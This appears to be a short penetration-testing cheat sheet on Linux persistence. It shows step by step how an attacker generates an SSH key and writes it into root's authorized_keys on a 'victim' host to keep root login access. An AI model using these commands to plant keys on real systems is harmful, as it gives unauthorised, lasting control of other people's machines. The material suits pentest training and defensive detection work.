# Linux/Unix Persistence

## Persistence

Sometimes we may need to maintain access to our target, there are a lot of methods that we can use to accomplish this task.

### SSH

```text
kali@kali:~$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa):
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /home/kali/.ssh/id_rsa.
Your public key has been saved in /home/kali/.ssh/id_rsa.pub.
...<snip>...
kali@kali:~$ cat ~/.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD... kali@kali
```

With our ssh key generated, we can create the authorized\_keys file on the host to accept our public key.

```text
root@victim: mkdir /root/.ssh
root@victim: echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD... kali@kali" > /root/.ssh/authorized_keys
```

Now on Kali, we can use the ssh client to connect to the victim directly.

```text
kali@kali:~$ ssh root@10.10.10.10
Welcome to Ubuntu 16.04 LTS (GNU/Linux 4.4.0-21-generic x86_64)
...<snip>...
root@victim:~#
```

